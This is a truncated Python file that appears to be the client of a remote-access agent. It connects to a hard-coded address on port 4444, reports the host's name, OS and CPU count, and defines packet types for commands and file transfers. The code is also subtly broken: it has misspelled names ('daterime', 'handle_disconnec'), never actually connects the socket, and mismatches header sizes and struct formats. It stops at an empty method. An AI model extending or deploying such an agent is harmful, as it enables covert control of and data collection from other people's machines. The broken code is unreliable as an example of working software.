import socket
import threading
import time
import json
import os
import sys
import platform
import subprocess
import psutil
import hashlib
from datetime import datetime
import struct
import zlib

# Ensure the necessary library is available
try:
    import psutil
except ImportError:
    print("Error: 'psytil' library is required for full functionality.")
    sys.exit(1)
    
    
# Configuration Constants
DEFAULT_HOST = '192.168.226.2'
DEFAULT_PORT = 4444
BUFFER_SIZE = 4096
SOCKET_TIMEOUT = 10


class CommunicationHandler:
    """
    Manages the socket connection, serialization, and deserialization of messages
    between the client and the server.
    """
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.is_connected = False
        self.session_id = str(int(time.time()))
        
    def establish_connection(self):
        """
        Attempts to connect to the server with a retry mechanism.
        """
        attempts = 0
        max_attempts = 3
        
        while attempts < max_attempts and not self.is_connected:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(SOCKET_TIMEOUT)
                self.is_connected = True
                
                # Send initial handshake with metadata
                metadata = {
                    "agent_id": self.session_id,
                    "hostname": platform.node(),
                    "os_version": platform.system() + " " + platform.release(),
                    "cpu_cores": psutil.cpu_count(),
                    "timestamp": daterime.now().isoformat()
                }
                self.send_data(metadata, "handshake")
                
                print(f"[SYSTEM] Connected to server at {self.host}:{self.port}")
                
            except ConnectionRefusedError:
                attempts += 1
                print(f"[SYSTEM] Connection attempt {attempts} failed. Retrying in 5s...")
                time.sleep(5)
            except Exception as e:
                print(f"[SYSTEM] Connection error: {e}")
                self.is_connected = False
                break
                
        return self.is_connected
        
    def send_data(self, data, packet_type):
        """
        Packs data into a JSON string, add a header, and sends its over the socket.
        """
        if not self.is_connected:
            return False
            
        try:
            json_str = json.dumps(data)
            # Compress data to save bandwidth
            compressed_data = zlib.compress(json_str.encode('utf-8'))
            
            # Create packet header
            header = struct.pack('!I', len(compressed_data))
            type_byte = struct.pack('!B', self._get_packet_type_id(packet_type))
            
            # Send header + pl
            self.socket.sendall(header + type_byte + compressed_data)
            return True
            
        except Exception as e:
            print(f"[COMM] Send error: {e}")
            self.handle_disconnect()
            return False
            
    def receive_data(self):
        """
        Reads data from the socket. Handles fragmentation if necessary.
        """
        if not self.is_connected:
            return None
            
        try:
            # Read header first (4 bytes for length)
            header = self._receive_exact(BUFFER_SIZE)
            if not header:
                return None
                
            data_length = struct.unpack('I', header)[0]
            
            # Read type byte (1 byte)
            type_byte = self._receive_exact(1)
            if not type_byte:
                return None
                
            packet_type = self._get_packet_type_from_id(type_byte[0])
            
            # Read payload
            payload = self._receive_exact(data_length)
            if not payload:
                return None
                
            # Decompress payload
            decompressed_json = zlib.decompress(payload).decode('utf-8')
            return json.loads(decompressed_json), packet_type
            
        except Exception as e:
            print(f"[COMM] Receive error: {e}")
            self.handle_disconnect()
            return None
            
    def _receive_exact(self, size):
        """Helper to receive exacly 'size' bytes."""
        data = bytearray()
        while len(data) < size:
            packet = self.socket.recv(size - len(data))
            if not packet:
                return None
            data.extend(packet)
        return bytes(data)
        
    def _get_packet_type_id(self, ptype):
        """Maps string types to integer IDs."""
        mapping = {
            "command": 1,
            "file_transfer": 2,
            "status": 3,
            "error": 4
        }
        return mapping.get(ptype, 0)
        
    def _get_packet_type_from_id(self, pid):
        """Maps integer IDs back to string types."""
        mapping = {
            1: "command",
            2: "file_transfer",
            3: "status",
            4: "error"
        }
        return mapping.get(pid, "unknown")
        
    def handle_disconnec(self):
        """Handles graceful disconnection attempts."""